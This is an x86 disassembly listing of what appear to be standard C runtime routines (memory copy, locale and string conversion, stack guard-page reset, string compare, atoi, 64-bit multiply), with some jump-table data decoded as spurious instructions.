  42832c:	mov    ecx,DWORD PTR fs:0x0
  428333:	cmp    DWORD PTR [ecx+0x4],0x4282a0
  42833a:	jne    0x42834c
  42833c:	mov    edx,DWORD PTR [ecx+0xc]
  42833f:	mov    edx,DWORD PTR [edx+0xc]
  428342:	cmp    DWORD PTR [ecx+0x8],edx
  428345:	jne    0x42834c
  428347:	mov    eax,0x1
  42834c:	ret    
  42834d:	push   ebx
  42834e:	push   ecx
  42834f:	mov    ebx,0x46344c
  428354:	jmp    0x428360
  428356:	push   ebx
  428357:	push   ecx
  428358:	mov    ebx,0x46344c
  42835d:	mov    ecx,DWORD PTR [ebp+0x8]
  428360:	mov    DWORD PTR [ebx+0x8],ecx
  428363:	mov    DWORD PTR [ebx+0x4],eax
  428366:	mov    DWORD PTR [ebx+0xc],ebp
  428369:	pop    ecx
  42836a:	pop    ebx
  42836b:	ret    0x4
  42836e:	int3   
  42836f:	int3   
  428370:	push   ebp
  428371:	mov    ebp,esp
  428373:	push   edi
  428374:	push   esi
  428375:	mov    esi,DWORD PTR [ebp+0xc]
  428378:	mov    ecx,DWORD PTR [ebp+0x10]
  42837b:	mov    edi,DWORD PTR [ebp+0x8]
  42837e:	mov    eax,ecx
  428380:	mov    edx,ecx
  428382:	add    eax,esi
  428384:	cmp    edi,esi
  428386:	jbe    0x428390
  428388:	cmp    edi,eax
  42838a:	jb     0x42850c
  428390:	test   edi,0x3
  428396:	jne    0x4283ac
  428398:	shr    ecx,0x2
  42839b:	and    edx,0x3
  42839e:	cmp    ecx,0x8
  4283a1:	jb     0x4283cc
  4283a3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4283a5:	jmp    DWORD PTR [edx*4+0x4284bc]
  4283ac:	mov    eax,edi
  4283ae:	mov    edx,0x3
  4283b3:	sub    ecx,0x4
  4283b6:	jb     0x4283c4
  4283b8:	and    eax,0x3
  4283bb:	add    ecx,eax
  4283bd:	jmp    DWORD PTR [eax*4+0x4283d0]
  4283c4:	jmp    DWORD PTR [ecx*4+0x4284cc]
  4283cb:	nop
  4283cc:	jmp    DWORD PTR [ecx*4+0x428450]
  4283d3:	nop
  4283d4:	loopne 0x428359
  4283d6:	inc    edx
  4283d7:	add    BYTE PTR [esp+eax*4],cl
  4283da:	inc    edx
  4283db:	add    BYTE PTR [eax],dh
  4283dd:	test   BYTE PTR [edx+0x0],al
  4283e0:	and    edx,ecx
  4283e2:	mov    al,BYTE PTR [esi]
  4283e4:	mov    BYTE PTR [edi],al
  4283e6:	mov    al,BYTE PTR [esi+0x1]
  4283e9:	mov    BYTE PTR [edi+0x1],al
  4283ec:	mov    al,BYTE PTR [esi+0x2]
  4283ef:	shr    ecx,0x2
  4283f2:	mov    BYTE PTR [edi+0x2],al
  4283f5:	add    esi,0x3
  4283f8:	add    edi,0x3
  4283fb:	cmp    ecx,0x8
  4283fe:	jb     0x4283cc
  428400:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428402:	jmp    DWORD PTR [edx*4+0x4284bc]
  428409:	lea    ecx,[ecx+0x0]
  42840c:	and    edx,ecx
  42840e:	mov    al,BYTE PTR [esi]
  428410:	mov    BYTE PTR [edi],al
  428412:	mov    al,BYTE PTR [esi+0x1]
  428415:	shr    ecx,0x2
  428418:	mov    BYTE PTR [edi+0x1],al
  42841b:	add    esi,0x2
  42841e:	add    edi,0x2
  428421:	cmp    ecx,0x8
  428424:	jb     0x4283cc
  428426:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428428:	jmp    DWORD PTR [edx*4+0x4284bc]
  42842f:	nop
  428430:	and    edx,ecx
  428432:	mov    al,BYTE PTR [esi]
  428434:	mov    BYTE PTR [edi],al
  428436:	add    esi,0x1
  428439:	shr    ecx,0x2
  42843c:	add    edi,0x1
  42843f:	cmp    ecx,0x8
  428442:	jb     0x4283cc
  428444:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428446:	jmp    DWORD PTR [edx*4+0x4284bc]
  42844d:	lea    ecx,[ecx+0x0]
  428450:	mov    bl,0x84
  428452:	inc    edx
  428453:	add    BYTE PTR [eax-0x67ffbd7c],ah
  428459:	test   BYTE PTR [edx+0x0],al
  42845c:	nop
  42845d:	test   BYTE PTR [edx+0x0],al
  428460:	mov    BYTE PTR [edx+eax*2+0x42848000],al
  428467:	add    BYTE PTR [eax-0x7c],bh
  42846a:	inc    edx
  42846b:	add    BYTE PTR [eax-0x7c],dh
  42846e:	inc    edx
  42846f:	add    BYTE PTR [ebx-0x761b71bc],cl
  428475:	inc    esp
  428476:	(bad)  
  428477:	in     al,0x8b
  428479:	inc    esp
  42847a:	mov    gs,eax
  42847c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  428480:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  428484:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  428488:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42848c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  428490:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  428494:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  428498:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42849c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4284a0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4284a4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4284a8:	lea    eax,[ecx*4+0x0]
  4284af:	add    esi,eax
  4284b1:	add    edi,eax
  4284b3:	jmp    DWORD PTR [edx*4+0x4284bc]
  4284ba:	mov    edi,edi
  4284bc:	int3   
  4284bd:	test   BYTE PTR [edx+0x0],al
  4284c0:	aam    0x84
  4284c2:	inc    edx
  4284c3:	add    al,ah
  4284c5:	test   BYTE PTR [edx+0x0],al
  4284c8:	hlt    
  4284c9:	test   BYTE PTR [edx+0x0],al
  4284cc:	mov    eax,DWORD PTR [ebp+0x8]
  4284cf:	pop    esi
  4284d0:	pop    edi
  4284d1:	leave  
  4284d2:	ret    
  4284d3:	nop
  4284d4:	mov    al,BYTE PTR [esi]
  4284d6:	mov    BYTE PTR [edi],al
  4284d8:	mov    eax,DWORD PTR [ebp+0x8]
  4284db:	pop    esi
  4284dc:	pop    edi
  4284dd:	leave  
  4284de:	ret    
  4284df:	nop
  4284e0:	mov    al,BYTE PTR [esi]
  4284e2:	mov    BYTE PTR [edi],al
  4284e4:	mov    al,BYTE PTR [esi+0x1]
  4284e7:	mov    BYTE PTR [edi+0x1],al
  4284ea:	mov    eax,DWORD PTR [ebp+0x8]
  4284ed:	pop    esi
  4284ee:	pop    edi
  4284ef:	leave  
  4284f0:	ret    
  4284f1:	lea    ecx,[ecx+0x0]
  4284f4:	mov    al,BYTE PTR [esi]
  4284f6:	mov    BYTE PTR [edi],al
  4284f8:	mov    al,BYTE PTR [esi+0x1]
  4284fb:	mov    BYTE PTR [edi+0x1],al
  4284fe:	mov    al,BYTE PTR [esi+0x2]
  428501:	mov    BYTE PTR [edi+0x2],al
  428504:	mov    eax,DWORD PTR [ebp+0x8]
  428507:	pop    esi
  428508:	pop    edi
  428509:	leave  
  42850a:	ret    
  42850b:	nop
  42850c:	lea    esi,[ecx+esi*1-0x4]
  428510:	lea    edi,[ecx+edi*1-0x4]
  428514:	test   edi,0x3
  42851a:	jne    0x428540
  42851c:	shr    ecx,0x2
  42851f:	and    edx,0x3
  428522:	cmp    ecx,0x8
  428525:	jb     0x428534
  428527:	std    
  428528:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42852a:	cld    
  42852b:	jmp    DWORD PTR [edx*4+0x428658]
  428532:	mov    edi,edi
  428534:	neg    ecx
  428536:	jmp    DWORD PTR [ecx*4+0x428608]
  42853d:	lea    ecx,[ecx+0x0]
  428540:	mov    eax,edi
  428542:	mov    edx,0x3
  428547:	cmp    ecx,0x4
  42854a:	jb     0x428558
  42854c:	and    eax,0x3
  42854f:	sub    ecx,eax
  428551:	jmp    DWORD PTR [eax*4+0x42855c]
  428558:	jmp    DWORD PTR [ecx*4+0x428658]
  42855f:	nop
  428560:	ins    BYTE PTR es:[edi],dx
  428561:	test   DWORD PTR [edx+0x0],eax
  428564:	nop
  428565:	test   DWORD PTR [edx+0x0],eax
  428568:	mov    eax,0x8a004285
  42856d:	inc    esi
  42856e:	add    esp,DWORD PTR [ebx]
  428570:	ror    DWORD PTR [eax-0x117cfcb9],1
  428576:	add    ecx,eax
  428578:	jmp    0x232087f
  42857d:	cmp    ecx,0x8
  428580:	jb     0x428534
  428582:	std    
  428583:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428585:	cld    
  428586:	jmp    DWORD PTR [edx*4+0x428658]
  42858d:	lea    ecx,[ecx+0x0]
  428590:	mov    al,BYTE PTR [esi+0x3]
  428593:	and    edx,ecx
  428595:	mov    BYTE PTR [edi+0x3],al
  428598:	mov    al,BYTE PTR [esi+0x2]
  42859b:	shr    ecx,0x2
  42859e:	mov    BYTE PTR [edi+0x2],al
  4285a1:	sub    esi,0x2
  4285a4:	sub    edi,0x2
  4285a7:	cmp    ecx,0x8
  4285aa:	jb     0x428534
  4285ac:	std    
  4285ad:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4285af:	cld    
  4285b0:	jmp    DWORD PTR [edx*4+0x428658]
  4285b7:	nop
  4285b8:	mov    al,BYTE PTR [esi+0x3]
  4285bb:	and    edx,ecx
  4285bd:	mov    BYTE PTR [edi+0x3],al
  4285c0:	mov    al,BYTE PTR [esi+0x2]
  4285c3:	mov    BYTE PTR [edi+0x2],al
  4285c6:	mov    al,BYTE PTR [esi+0x1]
  4285c9:	shr    ecx,0x2
  4285cc:	mov    BYTE PTR [edi+0x1],al
  4285cf:	sub    esi,0x3
  4285d2:	sub    edi,0x3
  4285d5:	cmp    ecx,0x8
  4285d8:	jb     0x428534
  4285de:	std    
  4285df:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4285e1:	cld    
  4285e2:	jmp    DWORD PTR [edx*4+0x428658]
  4285e9:	lea    ecx,[ecx+0x0]
  4285ec:	or     al,0x86
  4285ee:	inc    edx
  4285ef:	add    BYTE PTR [esi+eax*4],dl
  4285f2:	inc    edx
  4285f3:	add    BYTE PTR [esi+eax*4],bl
  4285f6:	inc    edx
  4285f7:	add    BYTE PTR [esi+eax*4],ah
  4285fa:	inc    edx
  4285fb:	add    BYTE PTR [esi+eax*4],ch
  4285fe:	inc    edx
  4285ff:	add    BYTE PTR [esi+eax*4],dh
  428602:	inc    edx
  428603:	add    BYTE PTR [esi+eax*4],bh
  428606:	inc    edx
  428607:	add    BYTE PTR [edi-0x7a],cl
  42860a:	inc    edx
  42860b:	add    BYTE PTR [ebx-0x76e371bc],cl
  428611:	inc    esp
  428612:	(bad)  
  428613:	sbb    al,0x8b
  428615:	inc    esp
  428616:	mov    ds,WORD PTR [eax]
  428618:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42861c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  428620:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  428624:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  428628:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42862c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  428630:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  428634:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  428638:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42863c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  428640:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  428644:	lea    eax,[ecx*4+0x0]
  42864b:	add    esi,eax
  42864d:	add    edi,eax
  42864f:	jmp    DWORD PTR [edx*4+0x428658]
  428656:	mov    edi,edi
  428658:	push   0x70004286
  42865d:	xchg   BYTE PTR [edx+0x0],al
  428660:	add    BYTE PTR [esi-0x796bffbe],0x42
  428667:	add    BYTE PTR [ebx+0x5f5e0845],cl
  42866d:	leave  
  42866e:	ret    
  42866f:	nop
  428670:	mov    al,BYTE PTR [esi+0x3]
  428673:	mov    BYTE PTR [edi+0x3],al
  428676:	mov    eax,DWORD PTR [ebp+0x8]
  428679:	pop    esi
  42867a:	pop    edi
  42867b:	leave  
  42867c:	ret    
  42867d:	lea    ecx,[ecx+0x0]
  428680:	mov    al,BYTE PTR [esi+0x3]
  428683:	mov    BYTE PTR [edi+0x3],al
  428686:	mov    al,BYTE PTR [esi+0x2]
  428689:	mov    BYTE PTR [edi+0x2],al
  42868c:	mov    eax,DWORD PTR [ebp+0x8]
  42868f:	pop    esi
  428690:	pop    edi
  428691:	leave  
  428692:	ret    
  428693:	nop
  428694:	mov    al,BYTE PTR [esi+0x3]
  428697:	mov    BYTE PTR [edi+0x3],al
  42869a:	mov    al,BYTE PTR [esi+0x2]
  42869d:	mov    BYTE PTR [edi+0x2],al
  4286a0:	mov    al,BYTE PTR [esi+0x1]
  4286a3:	mov    BYTE PTR [edi+0x1],al
  4286a6:	mov    eax,DWORD PTR [ebp+0x8]
  4286a9:	pop    esi
  4286aa:	pop    edi
  4286ab:	leave  
  4286ac:	ret    
  4286ad:	push   ebp
  4286ae:	mov    ebp,esp
  4286b0:	sub    esp,0xc
  4286b3:	mov    eax,ds:0x462f30
  4286b8:	xor    eax,DWORD PTR [ebp+0x4]
  4286bb:	and    BYTE PTR [ebp-0x6],0x0
  4286bf:	push   0x6
  4286c1:	mov    DWORD PTR [ebp-0x4],eax
  4286c4:	lea    eax,[ebp-0xc]
  4286c7:	push   eax
  4286c8:	push   0x1004
  4286cd:	push   DWORD PTR [ebp+0x8]
  4286d0:	call   DWORD PTR ds:0x429138
  4286d6:	test   eax,eax
  4286d8:	jne    0x4286df
  4286da:	or     eax,0xffffffff
  4286dd:	jmp    0x4286e9
  4286df:	lea    eax,[ebp-0xc]
  4286e2:	push   eax
  4286e3:	call   0x4289ee
  4286e8:	pop    ecx
  4286e9:	mov    ecx,DWORD PTR [ebp-0x4]
  4286ec:	xor    ecx,DWORD PTR [ebp+0x4]
  4286ef:	call   0x425afc
  4286f4:	leave  
  4286f5:	ret    
  4286f6:	push   0x38
  4286f8:	push   0x42a000
  4286fd:	call   0x425434
  428702:	mov    eax,ds:0x462f30
  428707:	xor    eax,DWORD PTR [ebp+0x4]
  42870a:	mov    DWORD PTR [ebp-0x1c],eax
  42870d:	xor    edi,edi
  42870f:	mov    DWORD PTR [ebp-0x20],edi
  428712:	mov    DWORD PTR [ebp-0x24],edi
  428715:	mov    eax,DWORD PTR [ebp+0x14]
  428718:	mov    ebx,DWORD PTR [eax]
  42871a:	mov    DWORD PTR [ebp-0x28],ebx
  42871d:	mov    DWORD PTR [ebp-0x2c],edi
  428720:	mov    eax,DWORD PTR [ebp+0x8]
  428723:	cmp    eax,DWORD PTR [ebp+0xc]
  428726:	je     0x42889f
  42872c:	lea    ecx,[ebp-0x40]
  42872f:	push   ecx
  428730:	push   eax
  428731:	mov    esi,DWORD PTR ds:0x429104
  428737:	call   esi
  428739:	test   eax,eax
  42873b:	je     0x42875d
  42873d:	cmp    DWORD PTR [ebp-0x40],0x1
  428741:	jne    0x42875d
  428743:	lea    eax,[ebp-0x40]
  428746:	push   eax
  428747:	push   DWORD PTR [ebp+0xc]
  42874a:	call   esi
  42874c:	test   eax,eax
  42874e:	je     0x42875d
  428750:	cmp    DWORD PTR [ebp-0x40],0x1
  428754:	jne    0x42875d
  428756:	mov    DWORD PTR [ebp-0x2c],0x1
  42875d:	cmp    DWORD PTR [ebp-0x2c],edi
  428760:	je     0x42877c
  428762:	cmp    ebx,0xffffffff
  428765:	je     0x42876b
  428767:	mov    esi,ebx
  428769:	jmp    0x428777
  42876b:	push   DWORD PTR [ebp+0x10]
  42876e:	call   0x425a40
  428773:	pop    ecx
  428774:	mov    esi,eax
  428776:	inc    esi
  428777:	mov    DWORD PTR [ebp-0x44],esi
  42877a:	jmp    0x42877f
  42877c:	mov    esi,DWORD PTR [ebp-0x44]
  42877f:	cmp    DWORD PTR [ebp-0x2c],edi
  428782:	jne    0x42879e
  428784:	push   edi
  428785:	push   edi
  428786:	push   ebx
  428787:	push   DWORD PTR [ebp+0x10]
  42878a:	push   0x1
  42878c:	push   DWORD PTR [ebp+0x8]
  42878f:	call   DWORD PTR ds:0x429128
  428795:	mov    esi,eax
  428797:	mov    DWORD PTR [ebp-0x44],esi
  42879a:	cmp    esi,edi
  42879c:	je     0x4287f6
  42879e:	mov    DWORD PTR [ebp-0x4],edi
  4287a1:	lea    eax,[esi+esi*1]
  4287a4:	add    eax,0x3
  4287a7:	and    eax,0xfffffffc
  4287aa:	call   0x425480
  4287af:	mov    DWORD PTR [ebp-0x18],esp
  4287b2:	mov    ebx,esp
  4287b4:	mov    DWORD PTR [ebp-0x48],ebx
  4287b7:	lea    eax,[esi+esi*1]
  4287ba:	push   eax
  4287bb:	push   edi
  4287bc:	push   ebx
  4287bd:	call   0x427d30
  4287c2:	add    esp,0xc
  4287c5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4287c9:	jmp    0x4287e2
  4287cb:	xor    eax,eax
  4287cd:	inc    eax
  4287ce:	ret    
  4287cf:	mov    esp,DWORD PTR [ebp-0x18]
  4287d2:	call   0x4288c5
  4287d7:	xor    edi,edi
  4287d9:	xor    ebx,ebx
  4287db:	or     DWORD PTR [ebp-0x4],0xffffffff
  4287df:	mov    esi,DWORD PTR [ebp-0x44]
  4287e2:	cmp    ebx,edi
  4287e4:	jne    0x428804
  4287e6:	push   esi
  4287e7:	push   0x2
  4287e9:	call   0x426548
  4287ee:	pop    ecx
  4287ef:	pop    ecx
  4287f0:	mov    ebx,eax
  4287f2:	cmp    ebx,edi
  4287f4:	jne    0x4287fd
  4287f6:	xor    eax,eax
  4287f8:	jmp    0x4288b1
  4287fd:	mov    DWORD PTR [ebp-0x24],0x1
  428804:	push   esi
  428805:	push   ebx
  428806:	push   DWORD PTR [ebp-0x28]
  428809:	push   DWORD PTR [ebp+0x10]
  42880c:	push   0x1
  42880e:	push   DWORD PTR [ebp+0x8]
  428811:	call   DWORD PTR ds:0x429128
  428817:	test   eax,eax
  428819:	je     0x4288a2
  42881f:	cmp    DWORD PTR [ebp+0x18],edi
  428822:	je     0x428844
  428824:	push   edi
  428825:	push   edi
  428826:	push   DWORD PTR [ebp+0x1c]
  428829:	push   DWORD PTR [ebp+0x18]
  42882c:	push   esi
  42882d:	push   ebx
  42882e:	push   edi
  42882f:	push   DWORD PTR [ebp+0xc]
  428832:	call   DWORD PTR ds:0x4290bc
  428838:	test   eax,eax
  42883a:	je     0x4288a2
  42883c:	mov    eax,DWORD PTR [ebp+0x18]
  42883f:	mov    DWORD PTR [ebp-0x20],eax
  428842:	jmp    0x4288a2
  428844:	cmp    DWORD PTR [ebp-0x2c],edi
  428847:	jne    0x42885f
  428849:	push   edi
  42884a:	push   edi
  42884b:	push   edi
  42884c:	push   edi
  42884d:	push   esi
  42884e:	push   ebx
  42884f:	push   edi
  428850:	push   DWORD PTR [ebp+0xc]
  428853:	call   DWORD PTR ds:0x4290bc
  428859:	mov    esi,eax
  42885b:	cmp    esi,edi
  42885d:	je     0x4288a2
  42885f:	push   esi
  428860:	push   0x1
  428862:	call   0x426548
  428867:	pop    ecx
  428868:	pop    ecx
  428869:	mov    DWORD PTR [ebp-0x20],eax
  42886c:	cmp    eax,edi
  42886e:	je     0x4288a2
  428870:	push   edi
  428871:	push   edi
  428872:	push   esi
  428873:	push   eax
  428874:	push   esi
  428875:	push   ebx
  428876:	push   edi
  428877:	push   DWORD PTR [ebp+0xc]
  42887a:	call   DWORD PTR ds:0x4290bc
  428880:	cmp    eax,edi
  428882:	jne    0x428892
  428884:	push   DWORD PTR [ebp-0x20]
  428887:	call   0x42603a
  42888c:	pop    ecx
  42888d:	mov    DWORD PTR [ebp-0x20],edi
  428890:	jmp    0x4288a2
  428892:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  428896:	je     0x4288a2
  428898:	mov    ecx,DWORD PTR [ebp+0x14]
  42889b:	mov    DWORD PTR [ecx],eax
  42889d:	jmp    0x4288a2
  42889f:	mov    ebx,DWORD PTR [ebp-0x48]
  4288a2:	cmp    DWORD PTR [ebp-0x24],edi
  4288a5:	je     0x4288ae
  4288a7:	push   ebx
  4288a8:	call   0x42603a
  4288ad:	pop    ecx
  4288ae:	mov    eax,DWORD PTR [ebp-0x20]
  4288b1:	lea    esp,[ebp-0x54]
  4288b4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4288b7:	xor    ecx,DWORD PTR [ebp+0x4]
  4288ba:	call   0x425afc
  4288bf:	call   0x42546f
  4288c4:	ret    
  4288c5:	push   ebp
  4288c6:	mov    ebp,esp
  4288c8:	sub    esp,0x48
  4288cb:	push   ebx
  4288cc:	push   esi
  4288cd:	push   edi
  4288ce:	push   0x4
  4288d0:	pop    eax
  4288d1:	call   0x425480
  4288d6:	mov    ebx,esp
  4288d8:	push   0x1c
  4288da:	lea    eax,[ebp-0x24]
  4288dd:	push   eax
  4288de:	push   ebx
  4288df:	call   DWORD PTR ds:0x429054
  4288e5:	test   eax,eax
  4288e7:	je     0x42895a
  4288e9:	mov    edi,DWORD PTR [ebp-0x20]
  4288ec:	lea    eax,[ebp-0x48]
  4288ef:	push   eax
  4288f0:	call   DWORD PTR ds:0x42908c
  4288f6:	mov    eax,DWORD PTR [ebp-0x44]
  4288f9:	lea    esi,[eax-0x1]
  4288fc:	not    esi
  4288fe:	and    esi,ebx
  428900:	sub    esi,eax
  428902:	mov    DWORD PTR [ebp-0x4],eax
  428905:	mov    eax,ds:0x4635c4
  42890a:	mov    ecx,eax
  42890c:	dec    ecx
  42890d:	neg    ecx
  42890f:	sbb    ecx,ecx
  428911:	and    ecx,0xffff1000
  428917:	add    ecx,0x11000
  42891d:	add    ecx,edi
  42891f:	cmp    esi,ecx
  428921:	jb     0x42895a
  428923:	cmp    eax,0x1
  428926:	je     0x428972
  428928:	mov    ebx,edi
  42892a:	mov    edi,0x1000
  42892f:	push   0x1c
  428931:	lea    eax,[ebp-0x24]
  428934:	push   eax
  428935:	push   ebx
  428936:	call   DWORD PTR ds:0x429054
  42893c:	test   eax,eax
  42893e:	je     0x42895a
  428940:	add    ebx,DWORD PTR [ebp-0x18]
  428943:	test   DWORD PTR [ebp-0x14],edi
  428946:	je     0x42892f
  428948:	test   BYTE PTR [ebp-0xf],0x1
  42894c:	mov    ebx,DWORD PTR [ebp-0x24]
  42894f:	je     0x428956
  428951:	xor    eax,eax
  428953:	inc    eax
  428954:	jmp    0x42898e
  428956:	cmp    esi,ebx
  428958:	jae    0x42895e
  42895a:	xor    eax,eax
  42895c:	jmp    0x42898e
  42895e:	push   0x4
  428960:	push   edi
  428961:	push   DWORD PTR [ebp-0x4]
  428964:	push   ebx
  428965:	call   DWORD PTR ds:0x429058
  42896b:	mov    eax,ds:0x4635c4
  428970:	jmp    0x428974
  428972:	mov    ebx,esi
  428974:	dec    eax
  428975:	neg    eax
  428977:	sbb    eax,eax
  428979:	and    eax,0x103
  42897e:	lea    ecx,[ebp-0x8]
  428981:	push   ecx
  428982:	inc    eax
  428983:	push   eax
  428984:	push   DWORD PTR [ebp-0x4]
  428987:	push   ebx
  428988:	call   DWORD PTR ds:0x42906c
  42898e:	lea    esp,[ebp-0x54]
  428991:	pop    edi
  428992:	pop    esi
  428993:	pop    ebx
  428994:	leave  
  428995:	ret    
  428996:	int3   
  428997:	int3   
  428998:	int3   
  428999:	int3   
  42899a:	int3   
  42899b:	int3   
  42899c:	int3   
  42899d:	int3   
  42899e:	int3   
  42899f:	int3   
  4289a0:	push   ebp
  4289a1:	mov    ebp,esp
  4289a3:	push   edi
  4289a4:	push   esi
  4289a5:	push   ebx
  4289a6:	mov    esi,DWORD PTR [ebp+0xc]
  4289a9:	mov    edi,DWORD PTR [ebp+0x8]
  4289ac:	mov    al,0xff
  4289ae:	mov    edi,edi
  4289b0:	or     al,al
  4289b2:	je     0x4289e6
  4289b4:	mov    al,BYTE PTR [esi]
  4289b6:	add    esi,0x1
  4289b9:	mov    ah,BYTE PTR [edi]
  4289bb:	add    edi,0x1
  4289be:	cmp    ah,al
  4289c0:	je     0x4289b0
  4289c2:	sub    al,0x41
  4289c4:	cmp    al,0x1a
  4289c6:	sbb    cl,cl
  4289c8:	and    cl,0x20
  4289cb:	add    al,cl
  4289cd:	add    al,0x41
  4289cf:	xchg   al,ah
  4289d1:	sub    al,0x41
  4289d3:	cmp    al,0x1a
  4289d5:	sbb    cl,cl
  4289d7:	and    cl,0x20
  4289da:	add    al,cl
  4289dc:	add    al,0x41
  4289de:	cmp    al,ah
  4289e0:	je     0x4289b0
  4289e2:	sbb    al,al
  4289e4:	sbb    al,0xff
  4289e6:	movsx  eax,al
  4289e9:	pop    ebx
  4289ea:	pop    esi
  4289eb:	pop    edi
  4289ec:	leave  
  4289ed:	ret    
  4289ee:	push   esi
  4289ef:	push   edi
  4289f0:	call   0x4252e9
  4289f5:	mov    edi,DWORD PTR [eax+0x64]
  4289f8:	cmp    edi,DWORD PTR ds:0x46308c
  4289fe:	je     0x428a07
  428a00:	call   0x42678f
  428a05:	mov    edi,eax
  428a07:	mov    esi,DWORD PTR [esp+0xc]
  428a0b:	cmp    DWORD PTR [edi+0x28],0x1
  428a0f:	movzx  eax,BYTE PTR [esi]
  428a12:	jle    0x428a22
  428a14:	push   0x8
  428a16:	push   eax
  428a17:	push   edi
  428a18:	call   0x428a76
  428a1d:	add    esp,0xc
  428a20:	jmp    0x428a2c
  428a22:	mov    ecx,DWORD PTR [edi+0x48]
  428a25:	movzx  eax,BYTE PTR [ecx+eax*2]
  428a29:	and    eax,0x8
  428a2c:	test   eax,eax
  428a2e:	je     0x428a33
  428a30:	inc    esi
  428a31:	jmp    0x428a0b
  428a33:	movzx  ecx,BYTE PTR [esi]
  428a36:	inc    esi
  428a37:	cmp    ecx,0x2d
  428a3a:	mov    edx,ecx
  428a3c:	je     0x428a43
  428a3e:	cmp    ecx,0x2b
  428a41:	jne    0x428a47
  428a43:	movzx  ecx,BYTE PTR [esi]
  428a46:	inc    esi
  428a47:	xor    eax,eax
  428a49:	cmp    ecx,0x30
  428a4c:	jl     0x428a58
  428a4e:	cmp    ecx,0x39
  428a51:	jg     0x428a58
  428a53:	sub    ecx,0x30
  428a56:	jmp    0x428a5b
  428a58:	or     ecx,0xffffffff
  428a5b:	cmp    ecx,0xffffffff
  428a5e:	je     0x428a6c
  428a60:	lea    eax,[eax+eax*4]
  428a63:	lea    eax,[ecx+eax*2]
  428a66:	movzx  ecx,BYTE PTR [esi]
  428a69:	inc    esi
  428a6a:	jmp    0x428a49
  428a6c:	cmp    edx,0x2d
  428a6f:	pop    edi
  428a70:	pop    esi
  428a71:	jne    0x428a75
  428a73:	neg    eax
  428a75:	ret    
  428a76:	push   ebp
  428a77:	mov    ebp,esp
  428a79:	push   ecx
  428a7a:	mov    eax,DWORD PTR [ebp+0xc]
  428a7d:	lea    ecx,[eax+0x1]
  428a80:	cmp    ecx,0x100
  428a86:	mov    ecx,DWORD PTR [ebp+0x8]
  428a89:	ja     0x428a94
  428a8b:	mov    ecx,DWORD PTR [ecx+0x48]
  428a8e:	movzx  eax,WORD PTR [ecx+eax*2]
  428a92:	jmp    0x428ae8
  428a94:	push   esi
  428a95:	mov    edx,eax
  428a97:	sar    edx,0x8
  428a9a:	push   edi
  428a9b:	mov    edi,DWORD PTR [ecx+0x48]
  428a9e:	movzx  esi,dl
  428aa1:	test   BYTE PTR [edi+esi*2+0x1],0x80
  428aa6:	pop    edi
  428aa7:	pop    esi
  428aa8:	je     0x428ab9
  428aaa:	and    BYTE PTR [ebp-0x2],0x0
  428aae:	push   0x2
  428ab0:	mov    BYTE PTR [ebp-0x3],al
  428ab3:	mov    BYTE PTR [ebp-0x4],dl
  428ab6:	pop    eax
  428ab7:	jmp    0x428ac3
  428ab9:	and    BYTE PTR [ebp-0x3],0x0
  428abd:	mov    BYTE PTR [ebp-0x4],al
  428ac0:	xor    eax,eax
  428ac2:	inc    eax
  428ac3:	push   0x1
  428ac5:	push   DWORD PTR [ecx+0x14]
  428ac8:	push   DWORD PTR [ecx+0x4]
  428acb:	lea    ecx,[ebp+0xe]
  428ace:	push   ecx
  428acf:	push   eax
  428ad0:	lea    eax,[ebp-0x4]
  428ad3:	push   eax
  428ad4:	push   0x1
  428ad6:	call   0x427b58
  428adb:	add    esp,0x1c
  428ade:	test   eax,eax
  428ae0:	jne    0x428ae4
  428ae2:	leave  
  428ae3:	ret    
  428ae4:	movzx  eax,WORD PTR [ebp+0xe]
  428ae8:	and    eax,DWORD PTR [ebp+0x10]
  428aeb:	leave  
  428aec:	ret    
  428aed:	int3   
  428aee:	int3   
  428aef:	int3   
  428af0:	mov    eax,DWORD PTR [esp+0x8]
  428af4:	mov    ecx,DWORD PTR [esp+0x10]
  428af8:	or     ecx,eax
  428afa:	mov    ecx,DWORD PTR [esp+0xc]
  428afe:	jne    0x428b09
  428b00:	mov    eax,DWORD PTR [esp+0x4]
  428b04:	mul    ecx
  428b06:	ret    0x10
  428b09:	push   ebx
  428b0a:	mul    ecx
  428b0c:	mov    ebx,eax
  428b0e:	mov    eax,DWORD PTR [esp+0x8]
  428b12:	mul    DWORD PTR [esp+0x14]
  428b16:	add    ebx,eax
  428b18:	mov    eax,DWORD PTR [esp+0x8]
  428b1c:	mul    ecx
  428b1e:	add    edx,ebx
  428b20:	pop    ebx
  428b21:	ret    0x10
  428b24:	int3   
  428b25:	int3   
  428b26:	int3   
  428b27:	int3   
  428b28:	int3   
  428b29:	int3   
  428b2a:	int3   
  428b2b:	int3   
  428b2c:	int3   
